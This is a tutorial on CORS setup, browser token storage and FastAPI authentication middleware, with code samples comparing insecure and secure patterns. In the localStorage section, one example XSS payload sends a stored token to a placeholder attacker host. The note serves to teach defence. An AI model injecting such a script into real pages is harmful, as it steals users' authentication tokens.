# CORS, Token Storage & Auth Security Patterns

## CORS (Cross-Origin Resource Sharing)

### What is CORS?

When your frontend (running on `http://localhost:3000`) makes a request to your backend (`http://localhost:8000`), the browser blocks it by default. This is the **Same-Origin Policy** — a browser security mechanism.

CORS is the server saying: "I allow requests from these specific origins."

```
Frontend: http://localhost:3000
Backend:  http://localhost:8000
                    ↓
          Different port = different origin
                    ↓
          Browser blocks the request
                    ↓
          Unless backend sends CORS headers
```

### CORS Flow

```
Browser                          Server
  │                                │
  │ 1. Preflight (OPTIONS)         │
  │    Origin: http://localhost:3000│
  │───────────────────────────────>│
  │                                │
  │ 2. CORS Headers                │
  │    Access-Control-Allow-Origin │
  │    Access-Control-Allow-Methods│
  │<───────────────────────────────│
  │                                │
  │ 3. Actual Request (if allowed) │
  │    GET /api/data               │
  │    Authorization: Bearer xxx   │
  │───────────────────────────────>│
  │                                │
  │ 4. Response + CORS Headers     │
  │<───────────────────────────────│
```

### CORS in FastAPI

```python
from fastapi.middleware.cors import CORSMiddleware

# BAD: Allow everything (development only!)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],        # Any website can call your API
    allow_credentials=True,      # ⚠️ Cannot use "*" with credentials!
    allow_methods=["*"],
    allow_headers=["*"],
)

# GOOD: Specific origins (production)
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "http://localhost:3000",     # Dev frontend
        "https://myapp.example.com", # Production frontend
    ],
    allow_credentials=True,    # Allow cookies/auth headers
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
)
```

### Critical CORS Rule

**You cannot use `allow_origins=["*"]` with `allow_credentials=True` in production.** Browsers will reject it. If you need credentials (cookies, Authorization header), you must list specific origins.

### Common CORS Mistakes in Auth

| Mistake | Risk | Fix |
|---------|------|-----|
| `allow_origins=["*"]` in prod | Any website can call your API | List specific origins |
| Missing `Authorization` in allowed headers | Token-based auth fails | Add to `allow_headers` |
| Not handling OPTIONS preflight | CORS requests fail silently | FastAPI middleware handles this |
| Reflecting Origin header blindly | CSRF vulnerability | Whitelist, don't reflect |

## Token Storage Strategies

Where you store JWT tokens in the browser matters enormously for security.

### Option 1: HTTP-Only Cookie (Most Secure for Web)

```python
# Backend sets the cookie
from fastapi import Response

@app.post("/api/login")
def login(response: Response, ...):
    token = create_access_token(...)
    response.set_cookie(
        key="access_token",
        value=token,
        httponly=True,     # JavaScript cannot read this cookie
        secure=True,       # Only sent over HTTPS
        samesite="strict", # Not sent with cross-site requests
        max_age=1800,      # 30 minutes
    )
    return {"message": "Logged in"}
```

| Pros | Cons |
|------|------|
| Immune to XSS (JS can't read it) | Vulnerable to CSRF (need CSRF tokens) |
| Automatic with every request | Cookie size limit (4KB) |
| Server controls expiry | Harder with cross-domain APIs |

### Option 2: In-Memory Variable (Good for SPAs)

```javascript
// Store token in a JavaScript variable — lost on page refresh
let accessToken = null;

async function login(username, password) {
    const res = await fetch('/api/login', { ... });
    const data = await res.json();
    accessToken = data.access_token;  // In memory only
}

// Include in requests manually
fetch('/api/data', {
    headers: { 'Authorization': `Bearer ${accessToken}` }
});
```

| Pros | Cons |
|------|------|
| Immune to CSRF | Lost on page refresh (need refresh tokens) |
| Immune to XSS (if no DOM exposure) | Must manage lifecycle manually |
| Works with any API domain | Must implement token refresh |

### Option 3: localStorage (AVOID for auth tokens)

```javascript
// RISKY: Any JavaScript on the page can read this
localStorage.setItem('token', accessToken);
// XSS attack: <script>fetch('evil.com?token=' + localStorage.getItem('token'))</script>
```

| Pros | Cons |
|------|------|
| Persists across refreshes | Vulnerable to XSS |
| Simple API | Never cleared automatically |
| | Any JS library can read it |

### Recommended Strategy

```
Access Token  → In-memory variable (JS)
Refresh Token → HTTP-only cookie (secure, sameSite)

On page load:
1. Send refresh cookie to /api/refresh
2. Get new access token → store in memory
3. Use access token for API calls
4. When access token expires → repeat step 1
```

## Authentication Middleware Pattern

### FastAPI Dependency Injection (Recommended)

```python
from fastapi import Depends, HTTPException
from fastapi.security import OAuth2PasswordBearer

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="/api/login")

# This runs before every protected endpoint
async def get_current_user(token: str = Depends(oauth2_scheme)):
    payload = decode_token(token)  # Raises 401 if invalid
    user = get_user_from_db(payload["sub"])
    if not user:
        raise HTTPException(status_code=401)
    return user

# Usage: just add Depends()
@app.get("/api/protected")
def protected(user = Depends(get_current_user)):
    return {"user": user.username}
```

### Custom Middleware (For Global Auth)

```python
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.responses import JSONResponse

class AuthMiddleware(BaseHTTPMiddleware):
    # Endpoints that don't require auth
    PUBLIC_PATHS = {"/api/login", "/api/register", "/api/health", "/docs"}

    async def dispatch(self, request, call_next):
        if request.url.path in self.PUBLIC_PATHS:
            return await call_next(request)

        token = request.headers.get("Authorization", "").replace("Bearer ", "")
        if not token:
            return JSONResponse({"detail": "Not authenticated"}, status_code=401)

        try:
            payload = decode_token(token)
            request.state.user = payload  # Attach user to request
        except Exception:
            return JSONResponse({"detail": "Invalid token"}, status_code=401)

        return await call_next(request)

app.add_middleware(AuthMiddleware)
```

### Depends() vs Middleware

| Aspect | Depends() | Middleware |
|--------|-----------|-----------|
| Scope | Per-endpoint | Global (all requests) |
| Flexibility | Can vary per endpoint | Same logic everywhere |
| Error handling | FastAPI exception handling | Must return Response manually |
| Best for | Most APIs | Strict auth-everywhere policies |
| FastAPI idiomatic | Yes | Less common |
